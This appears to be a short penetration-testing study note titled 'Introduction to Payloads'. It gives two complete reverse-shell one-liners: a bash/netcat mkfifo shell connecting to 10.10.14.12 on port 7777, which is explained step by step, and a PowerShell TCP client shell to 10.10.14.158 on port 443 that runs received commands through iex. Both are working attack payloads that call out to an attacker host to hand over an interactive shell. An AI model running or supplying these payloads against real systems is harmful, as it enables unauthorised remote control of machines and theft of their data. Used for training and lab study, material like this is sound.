# Introduction to Payloads

## Netcat/Bash Reverse Shell One-liner

One-Line :
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f

Details :

rm -f /tmp/f; 
-> Removes the /tmp/f file if it exists

mkfifo /tmp/f; 
-> Makes a FIFO named pipe file

cat /tmp/f | 
-> Concatenates the FIFO named pipe file /tmp/f to the standard input of the next command

/bin/bash -i 2>&1 | 
-> Specifies the command language interpreter using the -i option to ensure the shell is interactive

nc 10.10.14.12 7777 > /tmp/f  
-> Uses Netcat to send a connection to our attack host 10.10.14.12 listening on port 7777

## PowerShell One-liner Explained

powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

